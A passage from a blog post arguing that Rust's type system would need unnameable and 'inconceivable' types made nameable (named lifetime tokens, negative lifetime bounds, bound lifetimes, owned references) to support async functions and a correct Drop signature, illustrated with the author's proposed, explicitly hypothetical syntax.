</code></pre></div>

<p>In order to create this type, we ‚Äújust‚Äù have to list every local variable that is live at an await point, along with the types of all those local variables. Therefore, supporting async functions in safe Rust is just a matter of making it consistently possible to name the types of every variable. So why is this impossible to do right now? The first obstacle is <strong>unnameable types</strong>.</p>

<h2 id="unnameable-types">Unnameable types</h2>

<p><img src="https://blog.polybdenum.com/img/20240606_padme_rust.jpg"></p>

<p>Rust made the interesting design decision to <em>require</em> explicit type annotations on every function boundary and every custom type, and yet also make it <em>impossible</em> to write explicit types in many cases. This was already a problem in Rust 1.0 with closures, but got much worse a few years later with the introduction of async Rust and impl Trait.</p>

<p>Basically, some types (closures, async functions, impl Trait) <em>exist</em> in Rust‚Äôs type system but do not have a <em>name</em> and hence are impossible to <em>talk about</em> in your code. You can still pass those values around and interact with them as long as you never have to explicitly name their type, but as soon as you hit a function boundary or want to store them inside a struct or enum, whoops, it‚Äôs time to add generics or pointlessly <code>Box</code> everything up.</p>

<p>Even in the example code above, this is already a problem. I had to go out of my way to make <code>sub</code> return a boxed <code>dyn Future</code> in order to have a nameable type for the sake of example, but any realistic code would instead be working with unnameable futures everywhere.</p>

<p>Fortunately, this is also a very easy problem to solve - <strong>just give every type a name</strong>. Efforts to do this already have been indefinitely stalled over concerns about stabilizing the order of generic type parameters, but that‚Äôs a trivial concern compared to the much more invasive changes we‚Äôll get into later.</p>

<h3 id="named-lifetimes">Named lifetimes</h3>

<p>There‚Äôs actually another kind of unnameable type as well - function local lifetimes. Unlike closures and futures, these can never cross a function boundary without being replaced by generic parameters, so they don‚Äôt cause problems for <em>existing</em> code, but they‚Äôre still types that can‚Äôt be named, and if we‚Äôre going to support async functions in Rust, we need a way to name them.</p>

<p>Any syntax actually added to Rust would obviously have to get bikeshedded to death and assessed for education and tooling and so on, but as I‚Äôm just a person writing a blog post, I‚Äôm under no such constraints, so for the sake of example, I‚Äôll propose the following syntax:</p>

<div><pre><code><span>let</span> <span>mut</span> <span>v</span> <span>=</span> <span>Vec</span><span>::</span><span>new</span><span>();</span>
<span>life</span> <span>'a</span><span>,</span> <span>'b</span><span>;</span>

<span>let</span> <span>r</span> <span>=</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>v</span><span>;</span>
<span>// do stuff with r</span>
<span>end</span> <span>'a</span><span>;</span>

<span>let</span> <span>r2</span> <span>=</span> <span>&amp;</span><span>'b</span> <span>mut</span> <span>v</span><span>;</span>
<span>// do stuff with r2</span>
<span>end</span> <span>'b</span><span>;</span>
</code></pre></div>

<p>In this proposal, you first declare a <em>lifetime token</em> via <code>life 'a</code>. This token represents a lifetime that lasts as long as the token exists. Next, when borrowing a reference, you can optionally specify an explicit lifetime, e.g. <code>&amp;'a mut v</code>. Finally, you can <em>end</em> a lifetime via <code>end 'a</code>, which consumes the token.</p>

<p>This syntax is more verbose than the current syntax, but I don‚Äôt expect users to actually use named lifetime syntax that often. I see it like <code>drop</code>. You <em>can</em> write all your <code>drop</code>s explicitly if you want to, but most of the time people let the compiler insert them implicitly instead. Likewise under my proposal, people will usually still use the current syntax and let the compiler implicitly insert anonymous lifetimes, but they can also write named lifetimes explicitly if they want to.</p>

<h3 id="static-checking">Static checking</h3>

<p>Under my named lifetimes proposal, <em>all checking is still done purely at compile time</em>, just like the existing borrow checker. The lifetime tokens only exist at compile time and there is no runtime impact.</p>

<p>In order to do all type checking statically, we have to enforce certain invariants. Specifically, <em>types can only refer to lifetimes in the current scope</em>. Any type that escapes outside of the scope of the lifetime token it refers to becomes invalid. Likewise, consuming a lifetime token invalidates all types that refer to that lifetime.</p>



<p>As it turns out, unnameable types aren‚Äôt the only barrier to naming the types of variables in Rust. Unnameable types are types that still exist in Rust‚Äôs formal type system, but don‚Äôt have names. However, Rust‚Äôs formal type system is only a subset of its de-facto type system because in addition to Rust‚Äôs official type checker, the compiler also incorporates <em>shadow type checkers</em> which do type-checking like things but are not formally part of the type checker.</p>

<p>There are types that are part of Rust‚Äôs de-facto type system which don‚Äôt even exist in Rust‚Äôs formal type system in the first place, let alone have names. I call these types <strong>inconceivable types</strong> because from the perspective of a Rust compiler engineer, they aren‚Äôt types and don‚Äôt even exist in the first place.</p>

<p>Therefore, in order to support async functions, we‚Äôll also need to add all the missing inconceivable types into Rust‚Äôs formal type system.</p>

<h3 id="partial-moves">Partial moves</h3>

<p>What are these shadow type checkers? Consider the following Rust code:</p>

<div><pre><code><span>use</span> <span>std</span><span>::</span><span>mem</span><span>::</span><span>drop</span><span>;</span>

<span>#[derive(Default)]</span>
<span>struct</span> <span>MyStrings</span> <span>{</span>
    <span>x</span><span>:</span> <span>String</span><span>,</span>
    <span>y</span><span>:</span> <span>String</span><span>,</span>
<span>}</span>

<span>async</span> <span>fn</span> <span>foo</span><span>()</span> <span>{</span>
    <span>let</span> <span>ms</span> <span>=</span> <span>MyStrings</span><span>::</span><span>default</span><span>();</span>
    
    <span>drop</span><span>(</span><span>ms</span><span>.x</span><span>);</span>
    <span>drop</span><span>(</span><span>ms</span><span>.y</span><span>);</span>
<span>}</span>
</code></pre></div>

<p>At first glance, this code shouldn‚Äôt compile. After all, <code>ms</code> is used twice, right? <code>ms</code> should already be moved when it is referenced the first time in <code>ms.x</code>, which would make <code>ms.y</code> a compile error. However, the Rust compiler actually allows this!</p>

<p>The reason is because Rust has a secret shadow type checker which allows you to partially move and partially borrow values as long as they stay within a function. The fact that this is limited to within a function makes it harder to spot since it never forces the user to write the function-boundary-mandatory type annotations that would be impossible since these types don‚Äôt actually exist in Rust‚Äôs formal type system.</p>

<p>However, they are still a problem for async functions because we need to be able to specify the types of <em>local</em> variables as well. Consider the following code:</p>

<div><pre><code><span>async</span> <span>fn</span> <span>foo</span><span>()</span> <span>{</span>
    <span>let</span> <span>ms</span> <span>=</span> <span>MyStrings</span><span>::</span><span>default</span><span>();</span>
    
    <span>drop</span><span>(</span><span>ms</span><span>.x</span><span>);</span>
    <span>// What is ms's type here?!?!</span>
    <span>sub</span><span>()</span><span>.await</span><span>;</span>
    <span>drop</span><span>(</span><span>ms</span><span>.y</span><span>);</span>
<span>}</span>
</code></pre></div>

<p>What is the type of <code>ms</code> at the await point? The formal type system would answer ‚Äúoh, the type is <code>MyStrings</code>, that doesn‚Äôt change.‚Äù However, its <em>de-facto</em> type clearly does change. After all, you can‚Äôt access the <code>x</code> field on it like you could for any true value of type <code>MyStrings</code>. The true type is now something else entirely, an inconceivable type.</p>

<p>Therefore, the next step is to add the inconceivable types for partial borrows and partial moves to Rust‚Äôs formal type system, so that they can be referenced in type annotations. For this, I propose the syntax <code>Foo{bar, baz}</code>, to list the fields explicitly. E.g. <code>MyStrings{y}</code> means a value with the <em>memory layout</em> of <code>MyStrings</code>, but where only field <code>y</code> remains (with the <code>x</code> part being arbitrary uninitialized data). This can be extended to partial borrows as well, e.g. <code>&amp;mut Foo{bar, baz}</code>.</p>

<p>However, that‚Äôs not all. There‚Äôs still one more shadow type checker to deal with, and it‚Äôs a really big one. As it turns out, the borrow checker is <em>also</em> a shadow type checker.</p>

<h3 id="borrowed-types">Borrowed types</h3>

<p>Consider the following code:</p>

<div><pre><code><span>async</span> <span>fn</span> <span>foo</span><span>()</span> <span>{</span>
    <span>let</span> <span>mut</span> <span>s</span> <span>=</span> <span>"Hello, world"</span><span>.to_string</span><span>();</span>
    <span>let</span> <span>r</span> <span>=</span> <span>&amp;</span><span>mut</span> <span>s</span><span>;</span>
    <span>// What is the type of s here???</span>
    <span>sub</span><span>()</span><span>.await</span><span>;</span>
    
    <span>r</span><span>.push</span><span>(</span><span>'!'</span><span>);</span>
    <span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>s</span><span>);</span>
<span>}</span>
</code></pre></div>

<p>What is the type of <code>s</code> at the await point? Again, the formal type system says ‚Äúit‚Äôs <code>String</code> the whole time, that doesn‚Äôt change‚Äù, but again that‚Äôs a lie. The de-facto type of <code>s</code> can‚Äôt be <code>String</code>, because it doesn‚Äôt support the operations of a value of type <code>String</code>. In fact, it doesn‚Äôt support <em>any</em> operations, because any attempt to access <code>s</code> at that point will result in a compile error.</p>

<p>Therefore, the type of <code>s</code> must be temporarily changing to some other, inconceivable type. Specifically, the types of <em>borrowed values</em> are inconceivable types.</p>

<p>For this, I propose the syntax <code>!'a mut String</code>, but to understand why, we‚Äôll first have to go into a brief digression on the theoretical basis for borrow checking.</p>

<h2 id="why-borrow-checking">Why borrow checking?</h2>

<p>There‚Äôs a common misconception, even in the Rust community, that borrow checking is just a memory management strategy, just a quirk of languages in the C++ niche and not something you need in a language with garbage collection. In fact however, borrow checking is the inevitable consequence of <a href="https://blog.polybdenum.com/2023/03/05/fixing-the-next-10-000-aliasing-bugs.html">protecting against aliasing bugs</a>, regardless of which memory management strategy a language uses.</p>

<h3 id="affine-types">Affine types</h3>

<p>In a traditional language, if you have a value of type <code>T</code>, you can make any number of copies of that value that all still have type T, just by reading it:</p>

<div><pre><code>let foo: T = ...;
let bar: T = foo;
// foo and bar have type T
</code></pre></div>

<p>However, this doesn‚Äôt work if you want to reason about aliasing. In particular, if you have a type for <em>exclusively referenced</em> objects (written <code>xcl</code> in this section for the sake of example), it is not sound to allow copying like this, because then you‚Äôll have two references to the same object, both of which think they are the only one.</p>

<p>Therefore, exclusive references must be <em>affine types</em>, meaning that they can only be used once.</p>

<h3 id="splitting">Splitting</h3>

<p>However, being able to use each value only once makes it impossible to write all but the most trivial programs. In order to do anything useful, you need to be able to <em>split</em> a type so you can use values more than once.</p>

<p>A type can be thought of as a set of permissions to access the associated value, and thus it is safe to copy a value as long as the <em>permissions</em> aren‚Äôt copied. Instead, the child values need to have a <em>disjoint</em> set of permissions.</p>

<p>For example, suppose we have an exclusive reference to an object with fields of type <code>T</code> and <code>U</code>.</p>

<div><pre><code>let a = {foo: _, bar: _};
// a has the type xcl {foo: T, bar: U};

let b = a as {foo: T};
// b has type xcl {foo: T}
// a has type xcl {bar: U}
</code></pre></div>

<p>We can create a second reference to the object by <em>splitting</em> the permissions - after the split <code>a</code> <em>only</em> has the ability to read the field <code>bar</code> while <code>b</code> <em>only</em> has the ability to read field foo. Since they can only read disjoint parts of the object, it is still sound to have two exclusive references to the same object. (Note: this is pseudocode in a high level language for the sake of example - Rust doesn‚Äôt actually work this way due to other, low level considerations).</p>

<p>For traditional types (or <code>Copy</code> types in Rust parlance), you have the splitting rule <code>T =&gt; T + T</code>. In other words, given a value of <code>T</code>, you can split it into two values that both still have type <code>T</code>. For affine types, that splitting rule doesn‚Äôt exist, but there are still other splitting rules that are sound. For example, you can split by fields as we just saw: <code>xcl {foo: T, bar: U} =&gt; (xcl {foo: T}) + (xcl {bar: U})</code>.</p>

<h3 id="temporal-splitting">Temporal splitting</h3>

<p>The previous splitting rule is <em>spacial</em> - you can split access over disjoint fields of an object. However, spatial splitting alone doesn‚Äôt get you very far. In order to write practical code, you need another splitting rule. Besides splitting access by <em>space</em>, you can also split access by <em>time</em>.</p>

<p>Specifically, you can create a second copy of the reference as long as one copy can only be accessed <em>before</em> a given time, and the other copy can only be accessed <em>after</em> a given time. Since the access is split into disjoint periods of time, this is still sound.</p>

<div><pre><code><span>life</span> <span>'a</span><span>;</span>
<span>let</span> <span>v</span> <span>=</span> <span>vec!</span><span>[</span><span>42</span><span>];</span>
<span>// v has exclusive access to the object</span>

<span>let</span> <span>r</span> <span>=</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>v</span><span>;</span>
<span>// r has exclusive access to the object before time a</span>
<span>// v has exclusive access to the object *after* time a</span>
</code></pre></div>

<p>This is the essence of borrow checking. It‚Äôs not some arcane, low level memory management strategy, but just a natural, essential method of statically reasoning about <em>aliasing</em> in your code.</p>

<h3 id="negative-lifetime-bounds">Negative lifetime bounds</h3>

<p>Borrow checking involves two kinds of types - references that are valid <em>before</em> a given time, and references that are valid <em>after</em> a given time. The first kind is already part of Rust‚Äôs formal type system, the ordinary references you know and love. A value of type <code>&amp;'a mut T</code> has exclusive access <em>before</em> time <code>a</code>, and no access after time <code>a</code>.</p>

<p>However, Rust‚Äôs formal type system has no notion of the second kind of type, of references that are valid <em>after</em> a given time. This is the inconceivable type we need to add.</p>

<p>Since these are the opposite of normal lifetimes, it makes sense to use the ‚Äúnot‚Äù symbol <code>!</code>, e.g. <code>!'a</code>, which I call a <em>negative lifetime bound</em>. A bound of <code>'a</code> means the type is only valid <em>until</em> <code>a</code>, while a bound of <code>!'a</code> means it is only valid <em>after</em> <code>a</code> instead.</p>

<h2 id="bound-lifetimes">Bound lifetimes</h2>

<p>We can now express the types of all local variables, even the types that don‚Äôt currently exist in Rust, but there‚Äôs still one more problem. Recall that the example of named lifetimes looked like this:</p>

<div><pre><code><span>let</span> <span>mut</span> <span>v</span> <span>=</span> <span>Vec</span><span>::</span><span>new</span><span>();</span>
<span>life</span> <span>'a</span><span>,</span> <span>'b</span><span>;</span>

<span>let</span> <span>r</span> <span>=</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>v</span><span>;</span>
<span>// do stuff with r</span>
<span>end</span> <span>'a</span><span>;</span>

<span>let</span> <span>r2</span> <span>=</span> <span>&amp;</span><span>'b</span> <span>mut</span> <span>v</span><span>;</span>
<span>// do stuff with r2</span>
<span>end</span> <span>'b</span><span>;</span>
</code></pre></div>

<p>The problem is that the lifetime tokens (<code>'a</code> and <code>'b</code>) are <em>themselves</em> part of the function‚Äôs local state, and thus <em>also</em> have to be stored inside the state machine enum. Therefore, we need a way to store lifetime tokens inside of objects.</p>

<p>My proposed syntax introduces a new expression, <code>bind 'a in x</code>, which <em>moves</em> the lifetime token ‚Äòa into the value x. And likewise, we have new destructuring pattern syntax, <code>let bind 'a in x = y;</code>, to do the reverse. Lastly, this also adds a new type, <code>bind 'a in T</code>, representing a type <code>T</code> with bound lifetime token <code>'a</code>.</p>

<p>Note that lifetime tokens and lifetimes only exist at compile time and have no runtime representation. <code>bind 'a in v</code> and the like are noops that exist purely for the sake of static type checking, and <code>bind 'a in T</code> has the same runtime representation as <code>T</code>.</p>

<h3 id="moving-lifetime-tokens">Moving lifetime tokens</h3>

<p>With the <code>end 'a</code> syntax, the lifetime token <code>'a</code> is consumed in place, which means that we know precisely when it ends. All types in scope with a positive (<code>'a</code>) bound become invalid, while all types in scope with a negative bound (<code>!'a</code>) have the negative bound removed (returning it to the original, unborrowed type).</p>

<p>However, when we <em>move</em> a lifetime token into a value, types referring to that lifetime which were in the old scope but not the new scope have to be treated differently. In this case, the lifetime token is no longer in scope <em>without</em> being ended, and so we have to pessimistically invalidate both positive <em>and</em> negative bounds. Types that reference the lifetime which are still within the new scope (i.e. the value that the lifetime token was bound to) are unaffected.</p>

<h2 id="examples">Examples</h2>

<p>This can be pretty confusing, so let‚Äôs look at some examples to show how the new lifetime system works.</p>

<p>First, suppose you try to return a reference to a local variable:</p>

<div><pre><code><span>life</span> <span>'a</span><span>;</span>
<span>let</span> <span>mut</span> <span>s</span> <span>=</span> <span>Box</span><span>::</span><span>new</span><span>(</span><span>"Hello"</span><span>.to_string</span><span>());</span>
<span>// s has type Box&lt;String&gt;</span>
<span>let</span> <span>r</span> <span>=</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>*</span><span>s</span><span>;</span>
<span>// r has type &amp;'a mut String</span>
<span>// s has type Box&lt;!'a mut String&gt;</span>
<span>return</span> <span>r</span><span>;</span> <span>// error: r is invalid</span>
</code></pre></div>

<p>This naturally results in a compile error because <code>r</code> has the type <code>&amp;'a mut String</code>, but the lifetime token <code>'a</code> is <em>local</em> to the function. Therefore, when r is returned, it is no longer within the scope where <code>'a</code> exists and hence is invalid.</p>

<p>Now suppose we try binding <code>'a</code> to <code>r</code> before returning it:</p>

<div><pre><code><span>life</span> <span>'a</span><span>;</span>
<span>let</span> <span>mut</span> <span>s</span> <span>=</span> <span>Box</span><span>::</span><span>new</span><span>(</span><span>"Hello"</span><span>.to_string</span><span>());</span>
<span>// s has type Box&lt;String&gt;</span>
<span>let</span> <span>r</span> <span>=</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>*</span><span>s</span><span>;</span>
<span>// r has type &amp;'a mut String</span>
<span>// s has type Box&lt;!'a mut String&gt;</span>
<span>let</span> <span>ret</span> <span>=</span> <span>bind</span> <span>'a</span> <span>in</span> <span>r</span><span>;</span>
<span>// ret has type (bind 'a in &amp;'a mut String)</span>
<span>// s has type invalid</span>
<span>return</span> <span>ret</span><span>;</span> <span>// error: s is invalid</span>
</code></pre></div>

<p>This time, <code>ret</code> contains its own lifetime token, and so is not invalidated when returning. However, moving the lifetime token <code>'a</code> into <code>ret</code> invalidates <code>s</code>. Returning causes <code>s</code> to be implicitly dropped, but it can‚Äôt be dropped because it is invalid, resulting in a compile error.</p>

<p>Finally, let‚Äôs try binding <code>'a</code> to a tuple of both <code>r</code> <em>and</em> <code>s</code> and returning that:</p>

<div><pre><code><span>life</span> <span>'a</span><span>;</span>
<span>let</span> <span>mut</span> <span>s</span> <span>=</span> <span>Box</span><span>::</span><span>new</span><span>(</span><span>"Hello"</span><span>.to_string</span><span>());</span>
<span>// s has type Box&lt;String&gt;</span>
<span>let</span> <span>r</span> <span>=</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>*</span><span>s</span><span>;</span>
<span>// r has type &amp;'a mut String</span>
<span>// s has type Box&lt;!'a mut String&gt;</span>
<span>let</span> <span>ret</span> <span>=</span> <span>bind</span> <span>'a</span> <span>in</span> <span>(</span><span>s</span><span>,</span> <span>r</span><span>);</span>
<span>// ret has type (bind 'a in (Box&lt;!'a mut String&gt;, &amp;'a mut String))</span>
<span>return</span> <span>ret</span><span>;</span> <span>// ok</span>
</code></pre></div>

<p>This time, everything works. We‚Äôve just returned a string <em>along with a borrowed reference to that string</em> in a 100% safe and zero-cost manner!</p>

<h3 id="destructuring">Destructuring</h3>

<p>Now that we‚Äôve successfully returned a self-borrowed object, let‚Äôs look at how you would <em>use</em> an object with self-borrows.</p>

<div><pre><code><span>fn</span> <span>foo</span><span>(</span><span>v</span><span>:</span> <span>bind</span> <span>'a</span> <span>in</span> <span>(</span><span>Box</span><span>&lt;!</span><span>'a</span> <span>mut</span> <span>String</span><span>&gt;</span><span>,</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>String</span><span>))</span> <span>{</span>
    <span>// v has type (bind 'a in (Box&lt;!'a mut String&gt;, &amp;'a mut String))</span>

    <span>let</span> <span>bind</span> <span>'b</span> <span>in</span> <span>(</span><span>s</span><span>,</span> <span>r</span><span>)</span> <span>=</span> <span>v</span><span>;</span>
    <span>// 'b is a lifetime token</span>
    <span>// s has type Box&lt;!'b mut String&gt;</span>
    <span>// r has type &amp;'b mut String</span>

    <span>r</span><span>.push_str</span><span>(</span><span>" world!"</span><span>);</span>
    <span>end</span> <span>'b</span><span>;</span>
    <span>// s has type Box&lt;String&gt;</span>
    <span>// r is invalid</span>

    <span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>s</span><span>);</span>
<span>}</span>

</code></pre></div>

<h2 id="external-lifetimes">External lifetimes</h2>

<p>So far, we‚Äôve only looked at <em>owned</em> lifetime tokens. However, in some cases, you instead have a <em>reference</em> to an unknown lifetime token that exists elsewhere. There are two cases where this can happen:</p>

<p><strong>Generic lifetime parameters</strong></p>

<p>When a generic function is called, the generic lifetime parameters represent <em>some</em> lifetime which is owned by some caller of the function. These lifetimes are guaranteed to last at least as long as the function call, but could last longer.</p>

<p><strong>Destructured <em>references</em> to bound lifetimes</strong></p>

<p>In the previous example, we destructured an <em>owned value</em> that contained a lifetime token, resulting in the token being moved into the current scope.</p>

<p>If you destructure a <em>reference</em> to a value with a lifetime token, you instead get a reference to a lifetime token, rather than the token itself. These lifetimes are guaranteed to last at least as long as the destructured reference, but could last longer.</p>

<p>When you have a reference to an external lifetime, you can‚Äôt <em>end</em> or <em>move</em> the lifetime, since you don‚Äôt own the corresponding token. However, as long as the lifetime reference exists, you still can interact with types that refer to that lifetime.</p>

<p>Here‚Äôs an example of mutating a value with a bound lifetime via a mutable reference:</p>

<div><pre><code><span>fn</span> <span>foo</span><span>&lt;</span><span>'call</span><span>&gt;</span><span>(</span><span>v</span><span>:</span> <span>&amp;</span><span>'call</span> <span>mut</span> <span>(</span><span>bind</span> <span>'a</span> <span>in</span> <span>(</span><span>!</span><span>'a</span> <span>String</span><span>,</span> <span>&amp;</span><span>'a</span> <span>str</span><span>)))</span> <span>{</span>
    <span>// 'call is an external lifetime</span>
    <span>// v has type &amp;'call mut (bind 'a in (!'a String, &amp;'a str))</span>

    <span>let</span> <span>bind</span> <span>'b</span> <span>in</span> <span>(</span><span>s</span><span>,</span> <span>r</span><span>)</span> <span>=</span> <span>v</span><span>;</span>
    <span>// 'b is an external lifetime</span>
    <span>// s has type &amp;'call mut (!'b String)</span>
    <span>// r has type &amp;'call mut (&amp;'b str)</span>

    <span>let</span> <span>(</span><span>r1</span><span>,</span> <span>r2</span><span>)</span> <span>=</span> <span>r</span><span>.split_at</span><span>(</span><span>32</span><span>);</span>
    <span>// r1 and r2 have type (&amp;'b str)</span>

    <span>// can assign back to r since they both have type &amp;'b str</span>
    <span>*</span><span>r</span> <span>=</span> <span>r2</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Lastly, we also need to add a type to represent bound <em>lifetime references</em> in a type. However, the recursion stops there because a reference to a reference to a lifetime is equivalent to just a reference to a lifetime, since they don‚Äôt actually have any state or runtime representation and can‚Äôt be mutated.</p>

<h2 id="part-2-the-bytes-level">Part 2: The bytes level</h2>

<p>If we were writing a high-level language, we‚Äôd already be done, but for Rust, we still have the low-level details to worry about.</p>

<p>There are two ways to consider a type system. The first is <em>what</em> your code does, in an abstract machine, with no concerns about how it is actually implemented. I call this ‚Äúthe value level‚Äù.</p>

<p>The second level is <em>how</em> your code does it, in terms of low level implementation details like how values are stored in memory, which I call ‚Äúthe bytes level‚Äù. In a high level language, this might not even be exposed to users, but as Rust is a systems language, it gives programmers control over low level details like this.</p>

<p>To keep things simple, Rust has a single type system which implicitly encodes both levels in a single type. Unfortunately, this means that the desired combination is sometimes simply not represented in Rust‚Äôs type system.</p>

<p>In particular, Rust conflates ownership of <em>values</em> with ownership of <em>the memory where those values are stored</em>. This isn‚Äôt just a problem for a <em>new</em> feature like async functions. It causes problems even in ordinary real-world Rust coding. In particular, it means that <code>Drop</code> has the wrong type signature because the correct type signature simply doesn‚Äôt exist in Rust.</p>

<h2 id="drop">Drop</h2>

<p>When I say ‚Äú<code>Drop</code> has the wrong type signature‚Äù, some people might be thinking, ‚Äúoh, you mean it should have wrapped <code>self</code> in <code>Pin</code>, right?‚Äù. But that‚Äôs just a minor inconvenience to people who are writing unsafe code anyway, and <code>Pin</code> itself only dates back to Rust 1.33.0. The problem I‚Äôm talking about is much worse. <strong><code>Drop</code> was broken, even in Rust 1.0</strong>.</p>

<p>For example, last year, I had a struct containing a Tokio oneshot channel, and I wanted to send on that channel when the container was dropped. No problem, I figured, this is exactly the kind of thing Rust is good at. Should be easy, right?</p>

<p>‚Ä¶right??</p>

<div><pre><code><span>struct</span> <span>Foo</span> <span>{</span>
    <span>channel</span><span>:</span> <span>tokio</span><span>::</span><span>sync</span><span>::</span><span>oneshot</span><span>::</span><span>Sender</span><span>&lt;</span><span>()</span><span>&gt;</span><span>,</span>
<span>}</span>
<span>impl</span> <span>Drop</span> <span>for</span> <span>Foo</span> <span>{</span>
    <span>fn</span> <span>drop</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>)</span> <span>{</span>
        <span>// error[E0507]: cannot move out of `self.channel` which is behind a mutable reference</span>
        <span>self</span><span>.channel</span><span>.send</span><span>(());</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>As it turns out, this seemingly simple task is <em>impossible</em> to do in Rust. (And yes, as always, you can throw away static checking and just use <code>unsafe</code> or wrap your type in an unnecessary <code>Option</code> or whatever. I‚Äôm talking about <em>safe</em> <em>zero-cost</em> Rust here.)</p>

<p>The reason why this seemingly simple code pattern is impossible is right there in the error message. <code>Drop</code> takes <code>self</code> <em>by mutable reference</em>. In Rust, mutable references have the <em>invariant</em> that the type is unchanged. You can‚Äôt move fields out of a mutable reference (unless you replace them with another value of the same type).</p>

<p>The whole point of a destructor is to destruct your type. The value is disassembled and the type goes away. You start with <code>T</code> and end with <em>nothing</em>. However, <code>Drop</code> takes <code>&amp;mut T</code> instead, which has the postcondition that everything is unchanged and your <code>T</code> is still sitting there, good as always. Somehow, Rust ended up with a destructor api <em>that can‚Äôt actually destruct anything</em>.</p>

<p>So how did Rust make such an obvious mistake? The problem is that the Rust designers painted themselves into a corner in a misguided attempt to minimize the number of types in the formal type system.</p>

<h3 id="owned-references">Owned references</h3>

<p>Currently, Rust has three kinds of types: <code>T</code>, <code>&amp;mut T</code>, and <code>&amp;T</code>. If you plot their ownership and representation, you get this:</p>

<table>
  <thead>
    <tr>
      <th>Type</th>
      <th>Owned?</th>
      <th>Representation</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>T</td>
      <td>yes</td>
      <td>inline</td>
    </tr>
    <tr>
      <td>&amp;mut T</td>
      <td>no</td>
      <td>pointer</td>
    </tr>
    <tr>
      <td>&amp;T</td>
      <td>no</td>
      <td>pointer</td>
    </tr>
  </tbody>
</table>

<p>Notice something missing? There is no possible type with ‚Äúyes, pointer‚Äù (or ‚Äúno, inline‚Äù for that matter, but that doesn‚Äôt matter much). Rust conflates <em>ownership</em> with <em>representation</em>. (More specifically, there is no way to own a <em>value</em> without owning the underlying memory - <code>Box&lt;T&gt;</code> is technically an owned pointer, but the pointer can only point to its own, owned memory, not memory that is managed elsewhere.)</p>

<p>In Rust, there is no way to transfer ownership of a value without <em>moving</em> the value. This was a major problem when Rust added async and decided that it needed to deal with non-movable types after all. Since the assumption of movability is built into the language in such a core way, there was no way to add non-movable types other than just saying ‚Äúok, everything related to them is unsafe, but here‚Äôs <code>Pin</code> so you can at least partially hide the unsafety from your users, have fun‚Äù.</p>

<p><code>Drop</code> can‚Äôt take <code>self</code> as a mutable reference because mutable references can‚Äôt be destructed, as discussed above. But it <em>also</em> can‚Äôt take <code>self</code> by <em>value</em>, because that makes it impossible to drop non-movable types. (There are also minor considerations around recursion, presumably the reason <code>Drop</code> didn‚Äôt take values even <em>before</em> Rust added non-movable types.)</p>

<p>The solution to this dilemma is that the <em>correct</em> type for <code>Drop</code> to take is a type that currently doesn‚Äôt exist - an <em>owned reference</em>, which I‚Äôll write <code>&amp;own T</code>.</p>

<p><code>&amp;own T</code> is similar to <code>&amp;mut T</code>, except that it <em>owns</em> the referenced value. This means that it has no post-conditions like <code>&amp;mut T</code> does, and you can freely move fields out of the reference, and it will implicitly drop anything remaining when it goes out of scope. However, unlike <code>Box&lt;T&gt;</code>, <code>&amp;own T</code> does not own the <em>memory</em>, meaning you can take an <code>&amp;own T</code> reference to values on the stack when you need to drop them, and even recursively take <code>&amp;own T</code> references to fields.</p>

<h3 id="owned-reference-example">Owned reference example</h3>

<p>So what would a <em>correct</em> version of <code>Drop</code> look like? Let‚Äôs look at an example.</p>

<p>First, let‚Äôs start with a simple struct with some fields and methods:</p>

<div><pre><code><span>struct</span> <span>MyStrings</span> <span>{</span>
    <span>x</span><span>:</span> <span>String</span><span>,</span>
    <span>y</span><span>:</span> <span>String</span><span>,</span>
<span>}</span>
<span>impl</span> <span>MyStrings</span> <span>{</span>
    <span>fn</span> <span>some_method</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>{</span>
        <span>println!</span><span>(</span><span>"{} {}"</span><span>,</span> <span>self</span><span>.x</span><span>,</span> <span>self</span><span>.y</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>We can implement <code>Drop</code> like this. <code>self</code> starts out as an owned reference to the full type, meaning we can call methods on it like normal. Once we move fields out of it, the type of <code>self</code> changes to the corresponding partial type (recall that Rust already supports partially moved types as an inconceivable type).</p>

<div><pre><code><span>impl</span> <span>Drop</span> <span>for</span> <span>MyStrings</span> <span>{</span>
    <span>fn</span> <span>drop</span><span>(</span><span>&amp;</span><span>own</span> <span>self</span><span>)</span> <span>{</span>
        <span>// self has type &amp;own MyStrings</span>
     
        <span>// we can call methods within drop()</span>
        <span>self</span><span>.some_method</span><span>();</span>
     
        <span>// now let's move a field</span>
        <span>let</span> <span>_</span> <span>=</span> <span>self</span><span>.x</span><span>;</span>
        <span>// self now has type &amp;own MyStrings{y}</span>
     
        <span>// we're too lazy to drop the other field, but it will be dropped implicitly</span>
        <span>// drop(self.y)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>When an owned reference goes out of scope, all remaining fields are dropped implicitly, not just inside a <code>drop</code> method, but anywhere an <code>&amp;own T</code> exists. This is important a) for avoiding leaks while unwinding when an exception is thrown and b) because people will often not explicitly drop everything in a <code>drop</code> impl.</p>

<h3 id="initialization">Initialization</h3>

<p><code>Drop</code> isn‚Äôt the only place where non-movable types cause a problem. Rust‚Äôs entire design is centered around the assumption that you can move anything. You move values to transfer ownership, you move values to change types, you move values to initialize objects, etc. Therefore, making Rust usable for non-movable types requires more changes.</p>

<p>Fortunately, we <em>already</em> have to support partially moved types <em>anyway</em>, and that also conveniently covers the initialization case as well as the destruction case. Initialization is basically the same process as dropping, just in reverse:</p>

<div><pre><code><span>let</span> <span>mut</span> <span>new</span> <span>=</span> <span>MyStrings</span><span>{};</span>
<span>// new has type MyStrings{}, a partially moved value</span>
<span>// this has the *memory layout* of MyStrings, but with no fields initialized</span>

<span>new</span><span>.x</span> <span>=</span> <span>"Hello"</span><span>.to_string</span><span>();</span>
<span>// new has type MyStrings{x}</span>

<span>new</span><span>.y</span> <span>=</span> <span>"World"</span><span>.to_string</span><span>();</span>
